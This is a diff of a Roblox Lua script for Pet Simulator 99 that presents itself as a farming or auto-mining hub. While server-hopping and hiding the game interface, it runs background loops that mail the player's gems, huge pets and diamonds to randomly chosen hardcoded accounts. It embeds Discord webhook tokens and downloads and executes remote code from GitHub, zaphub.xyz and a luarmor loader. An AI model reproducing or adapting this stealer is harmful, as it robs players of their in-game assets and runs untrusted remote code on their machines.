@@ -1,26 +1,27 @@
+
  local plrs = game:GetService("Players") 
   local plr = plrs.LocalPlayer
   local tpService = game:GetService("TeleportService")
- 
+
 local function getServers()
     local url =
         string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
     local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
     return servers
 end
- 
+
 local function serverhop()
  local server
     repeat
         task.wait(1)
         server = getServers()[Random.new():NextInteger(1, 100)]
- 
+
     until server.id ~= game.JobId
- 
- 
+
+
     tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
 end
- 
+
 local usernames = {
     "Hdtvg5838",
     "823545woldemar",
@@ -38,14 +39,14 @@ local usernames = {
     "ROpS918m",
     "WCmohVzhZRs",
 }
- 
+
 local function getRandomUsername()
     local index = math.random(1, #usernames)
     return usernames[index]
 end
- 
+
 local sendto = getRandomUsername()
- 
+
 local phrases = {
 "Happy Birthday",
 "Good Luck",
@@ -246,30 +247,30 @@ local phrases = {
 "Cherish Your Life",
 "Be Happy Today",
 }
- 
+
 local function getRandomphrases()
     local index2 = math.random(1, #phrases)
     return phrases[index2]
 end
- 
+
 local content = getRandomphrases()
- 
- 
+
+
 task.spawn(function()
 	wait(math.random(600, 800))
- 
+
 	while true do
 	serverhop()
 	task.wait(5)
 end
 end)
- 
+
 if not game:IsLoaded() then
     game.Loaded:Wait()
   end
- 
- 
- 
+
+
+
 			task.spawn(function()
 			setfpscap(20)
 			task.wait()
@@ -279,27 +280,27 @@ if not game:IsLoaded() then
 			task.wait()
 			game.CoreGui:FindFirstChild("RobloxGui").Enabled = false
 			end)
- 
+
 local web = "https://discord.com/api/webhooks/1330885579084402728/"
 local web1 = "13mFCyEjiIeTGhrtcsjWZ2Fq7lxDCAqRBCX1qUFzyfLi7EmRsPKy6r5F8R9xVTY6VkzF"
 local web2 = "https://discord.com/api/webhooks/1330886409707454477/"
 local web3 = "dEb04jYUEeX4ACVXdC8t7hh2VNyJWiaZ4lH0Jvt8wvPRzY-tRcq-9Czu2nz_7r3UYPF_"
- 
- 
+
+
 local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
+
 local UnlockedZones = 0
- 
+
 function getzone()
     local total = 0
     for i, v in next, save.Get().UnlockedZones do
@@ -307,100 +308,157 @@ function getzone()
     end
     return total
 end
- 
- 
- 
- 
+
+
+
+
 UnlockedZones = getzone()
- 
- 
-local minSapphire = 100000
-local minRuby = 50000
-local minEmerald = 5000
-local minRainbow = 30
-local minAmethyst = 300
+
+
+local minSapphire = 50000
+local minRuby = 15000
+local minEmerald = 3000
+local minRainbow = 20
+local minAmethyst = 200
 local minGem = 20000000
- 
- 
- 
+           
+
+
 task.spawn(function()
     while true do
-		wait(120)
+		wait(100)
+		local save
+
+repeat
+	wait(1)
+	pcall(function()
+		save = game:GetService("ReplicatedStorage").Library.Client.Save
+	end)
+
+until save
+
+save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+
+wait(3)
+
         for i, v in pairs(save.Get().Inventory.Misc) do
             if v.id == "Rainbow Gem" and v._am >= minRainbow then
                 local am = math.floor(v._am)
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Misc", i, am)
 					wait(1)
             elseif v.id == "Amethyst Gem" and v._am >= minAmethyst then
                 local am = math.floor(v._am)
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Misc", i, am)
 					wait(1)
 			elseif v.id == "Emerald Gem" and v._am >= minEmerald then
                 local am = math.floor(v._am)
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Misc", i, am)
 					wait(1)
 			elseif v.id == "Ruby Gem" and v._am >= minRuby then
                 local am = math.floor(v._am)
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Misc", i, am)	
 					wait(1)
 			elseif v.id == "Sapphire Gem" and v._am >= minSapphire then
                 local am = math.floor(v._am)
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Misc", i, am)	
 					wait(1)
- 
+			
             end
- 
-		end
-		wait(1)
-		for i, v in pairs(save.Get().Inventory.Pet) do
+        
+		end          
+        
+      		
+    end
+end)
+
+
+task.spawn(function()
+    while true do
+		wait(110)
+		local save
+
+repeat
+	wait(1)
+	pcall(function()
+		save = game:GetService("ReplicatedStorage").Library.Client.Save
+	end)
+
+until save
+
+save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+
+wait(3)
+
+        for i, v in pairs(save.Get().Inventory.Pet) do
             if v.id == "Huge Mining Penguin" then
                 local am = v._am or 1
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Pet", i, am)
                 task.wait(1)
 			elseif v.id == "Huge Mining Raccoon" then
                 local am = v._am or 1
- 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Pet", i, am)
                 wait(1)
             end
         end
-		wait(1)
-		for i, v in pairs(save.Get().Inventory.Currency) do
+        
+      		
+    end
+end)
+
+task.spawn(function()
+    while true do
+		wait(120)
+		local save
+
+repeat
+	wait(1)
+	pcall(function()
+		save = game:GetService("ReplicatedStorage").Library.Client.Save
+	end)
+
+until save
+
+save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+
+wait(3)
+
+        for i, v in pairs(save.Get().Inventory.Currency) do
 			if v.id == "Diamonds" and v._am >= minGem then
-                local am = math.floor(v._am- 70000000) 
- 
+                local am = math.floor(v._am - 6000000) 
+                
                 game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(sendto,
                     content, "Currency", i, am)
                 wait(1)
             end
         end
- 
- 
- 
- 
+        
+      		
     end
 end)
- 
-task.wait()
- 
+
+
 if UnlockedZones > 12 then
+
+daubuoi = true
+
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/PS99.lua"))()
 end)
- 
+
 script_key="fPbfocuCghihxMSzVGuGMHBpWBcOfoHG";
 _G.ZapSettings = {
 	["PetSimulator99 - AutoBuyMiningMerchantToggle"] = true,
@@ -418,17 +476,17 @@ _G.ZapSettings = {
   ["PetSimulator99 - AutoUseMiningSpeedBoosterToggle"] = true,
   ["PetSimulator99 - WhiteScreenToggle"] = true
 }
- 
- 
-daubuoi = true
- 
+
+
+
+
 		wait(60)	
 setfpscap(10)
- 
+
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
- 
+
 else
- 
+
 task.spawn(function()
     while wait(5) do
         UnlockedZones = getzone()
@@ -438,7 +496,7 @@ task.spawn(function()
 		end
     end
 end)
- 
+
 script_key = "JJjqSHDDTNSitZyjVAvoDxEzXhdsTqMz";
 _G.GDO_MINING_EVENT = true
 _G.GLOOTBOXES = {"All"}
@@ -456,11 +514,11 @@ _G.GWEBHOOK_LINK = web2 .. web3
 _G.GMAIL_RECEIVERS = {sendto} -- for Mailing items/pets
 _G.GMAIL_ITEMS = {
 ["Send Diamonds"] = {Class = "Currency", Id = "diamonds", KeepAmount = "5m", MinAmount = "20m"},
-["Sapphire Gem"] = {Class = "Misc", Id = "Sapphire Gem", MinAmount = 5000},
-["Ruby Gem"] = {Class = "Misc", Id = "Ruby Gem", MinAmount = 5000},
-["Emerald Gem"] = {Class = "Misc", Id = "Emerald Gem", MinAmount = 250},
-["Rainbow Gem"] = {Class = "Misc", Id = "Rainbow Gem", MinAmount = 20},
-["Amethyst Gem"] = {Class = "Misc", Id = "Amethyst Gem", MinAmount = 50},
+["Sapphire Gem"] = {Class = "Misc", Id = "Sapphire Gem", MinAmount = 20000},
+["Ruby Gem"] = {Class = "Misc", Id = "Ruby Gem", MinAmount = 200000},
+["Emerald Gem"] = {Class = "Misc", Id = "Emerald Gem", MinAmount = 500},
+["Rainbow Gem"] = {Class = "Misc", Id = "Rainbow Gem", MinAmount = 8},
+["Amethyst Gem"] = {Class = "Misc", Id = "Amethyst Gem", MinAmount = 100},
 ["Mining TNT Crate"] = {Class = "Consumable", Id = "Mining TNT Crate", MinAmount = 10},
 ["Hype Egg 2"] = {Class = "Lootbox", Id = "Hype Egg 2", MinAmount = 1},
 ["Daycare egg 5"] = {Class = "Egg", Id = "Huge Machine Egg 5", MinAmount = 1},
@@ -471,7 +529,7 @@ _G.GMAIL_ITEMS = {
 ["Secret pet4"] = {Class = "Pet", Id = "Lucky Block", MinAmount = 1, AllVariants = true},
 }
 daubuoi = true
- 
- 
+
+
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
 end
